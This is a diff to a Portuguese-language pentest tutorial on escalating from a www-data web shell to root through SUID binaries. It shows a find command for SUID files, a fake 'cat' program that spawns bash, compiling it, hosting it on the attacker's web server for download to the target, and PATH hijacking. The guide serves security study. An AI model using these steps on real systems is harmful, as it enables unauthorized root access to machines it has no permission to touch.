@@ -1,6 +1,18 @@
 ## Escalação de privilégios via binário SUID
 
-Considere um cenário de pós-exploração web após obter uma shell do usuário www-data (sem privilégios).
+Binários presentes no sistema, quando na situação de SUID, podem ser utilizados para escalar privilégios. Para isso, realize uma busca por esses binários:
+```
+find / -perm -4000 2>&-
+```
+Em seguida faça a consulta pelo nome do binário neste site: https://gtfobins.github.io/
+
+Caso exista um binário específico (que não possa ser encontrado no repositório acima) é interessante realizar um disassembly para verificar se o mesmo, em algum momento da execução, executa outros binários do sistema. Veja o cenário abaixo:
+
+<br>
+
+**Considere um cenário de pós-exploração web após obter uma shell do usuário www-data (sem privilégios).**
+
+<br>
 
 É necessário buscar por binários SUID
 ```
@@ -28,13 +40,13 @@ void main()
   system("/bin/bash");
 }
 ```
-Compile na mesma arquitetura do servidor alvo (**-m32** para sistemas 32 bits)
+Compile na mesma arquitetura do sistema alvo (**-m32** para sistemas 32 bits)
 ```
 gcc -m32 cat.c -o cat
 ```
 Será gerado um binário chamado **cat**, que chamaremos de cat "falso", uma vez que ele será executado no lugar do original.
 
-Transfira o cat "falso" para o servidor, podemos iniciar um web server na nossa máquina e baixar no servidor alvo (lembre-se de realizar o wget em um diretório que o usuário www-data possua permissões de escrita)
+Transfira o cat "falso" para o servidor. Podemos iniciar um web server na nossa máquina e baixar no servidor alvo (lembre-se de realizar a transferência em um diretório que o usuário www-data possua permissões de leitura/escrita)
 ```
 python3 -m http.server 80
 ```
@@ -67,6 +79,6 @@ Redefina o PATH conforme visto anteriormente para conseguirmos utilizar todos os
 PATH="/usr/local/bin:/usr/bin:/bin"
 ```
 
-Observe que foi obtido acesso root:
+Observe que foi obtido root:
 
 ![image](https://user-images.githubusercontent.com/76706456/180348567-8bd50b1a-b5fe-47d4-81a4-f45aecc46623.png)
